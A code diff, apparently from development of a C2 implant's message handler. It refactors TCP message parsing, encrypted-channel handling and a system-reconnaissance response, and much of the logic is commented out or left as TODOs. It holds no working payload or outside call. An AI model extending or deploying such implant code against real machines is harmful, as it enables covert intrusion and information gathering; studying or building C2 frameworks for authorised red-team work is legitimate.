@@ -4,7 +4,7 @@
 #include "MessageHandler.h"
 #include "MessageTypes.h"
 #include "MessagePublisher.h"
-#include "recon.h"
+#include "Recon.h"
 
 
 // this function processes the header of the message
@@ -12,10 +12,10 @@
 // the message. 
 //int processMessage(BYTE* payload, MessageHeader* header)
 // int processIncomingMessage(InternalMessage* msg, Config* config)
-bool MessageHandler::processMessage(InternalMessage* msg, Config* config) // NOTE: passing the config around is actual cancer... i wish i was writing this in c++
+bool MessageHandler::processMessage(InternalMessage* msg) // NOTE: passing the config around is actual cancer... i wish i was writing this in c++
 {
 	switch (msg->header.messageType) {
-		case SYSTEM_INFO:
+		case SYS_INFO:
 		{
 			ReconMessage reconMessage;
 			int status = generateReconMessage(&reconMessage);
@@ -23,7 +23,7 @@ bool MessageHandler::processMessage(InternalMessage* msg, Config* config) // NOT
 			// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
 			InternalMessage* response = (InternalMessage *)malloc(sizeof(InternalMessage));
 			memcpy(response->payload, &reconMessage, sizeof(ReconMessage));
-			response->header.payload_size = sizeof(ReconMessage);
+			response->header.dataSize = sizeof(ReconMessage);
 			//return send(msg->header.message_id);
 			//status |= send(response, config);
 			return status;
@@ -39,7 +39,7 @@ bool MessageHandler::processMessage(InternalMessage* msg, Config* config) // NOT
 
 		// ... other cases
 	}
-	return 0;
+	return false;
 }
 
 
@@ -62,10 +62,12 @@ bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received)
 		//int bytes_received = pRecv(config->sock, (char*)buffer, 4096, 0);
 
         InternalMessage resultMsg; // TODO: this needs to be initialized/allocated to be 0/NULL
-		handleTCP(buffer, bytes_received, &resultMsg, config); // maybe rename to handleTCPInbound?
+		//handleTCP(buffer, bytes_received, &resultMsg, config); // maybe rename to handleTCPInbound?
+		handleTCP(buffer, bytes_received, &resultMsg); // maybe rename to handleTCPInbound or handleConnection once polymorphic?
 
 		//publisher
-        send(&resultMsg, config); // TODO: check return value for errors
+        //send(&resultMsg, config); // TODO: check return value for errors
+		//sendMessage(&resultMsg); // TODO: check return value for errors
 
 
 
@@ -79,7 +81,8 @@ bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received)
 
 	return false; // if no errors, return 0
 }
-bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg, Config* config)
+//bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg, C2Profile* config)
+bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg)
 {
 	// Raw Bytes from Socket
 	uint8_t buf[4096]; // TODO: rename to plaintext?
@@ -90,7 +93,7 @@ bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalM
 	const uint8_t* ciphertext = rawData + 12;
 	size_t ciphertext_len = rawDataLength - 12 - 16;
 	const uint8_t* tag = rawData + 12 + ciphertext_len;
-	int decrypted_size = decrypt_aes_256_gcm(ciphertext, ciphertext_len, config->crypto_key, iv, tag, buf); // TODO: decrypted_size
+	//int decrypted_size = decrypt_aes_256_gcm(ciphertext, ciphertext_len, config->crypto_key, iv, tag, buf); // TODO: decrypted_size
 
 	// check if length(buf) is at least the sizeof(MessageHeader), otherwise throw error
 	// parseHeader()
@@ -108,7 +111,8 @@ bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalM
 	// EXECUTE (InternalMessage)
 	// call function based on InternalMessage
 	//processMessage(msg->payload, msg->header); // TODO: check return type for errors?
-	processMessage(msg, config);
+	//processMessage(msg, config);
+	processMessage(msg);
 
 	// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
 	//InternalMessage* response = malloc(sizeof(InternalMessage));
@@ -159,8 +163,8 @@ MessageHandler::MessageHandler(
 {}*/
 //MessageHandler::MessageHandler(C2Profile& config) {}
 
-    
-bool MessageHandler::sendMessage(); // overload this function?
+/*
+bool MessageHandler::sendMessage() // overload this function?
 {
 	// TODO: where does parsing go in this? (if it's even needed)
 
@@ -179,7 +183,7 @@ bool MessageHandler::sendMessage(); // overload this function?
 // TODO: setup a listener function that calls this function?
 // listener function simply calls recv and handles socket stuff?
 // recvMessage would just serve as a wrapper for that maybe?
-bool MessageHandler::recvMessage(); // overload this function?
+bool MessageHandler::recvMessage() // overload this function?
 {
 	// TODO: where does parsing go in this? (if it's even needed)
 
@@ -194,3 +198,4 @@ bool MessageHandler::recvMessage(); // overload this function?
 	// handle InternalMessage (based on its header)
 	return false;
 }
+*/
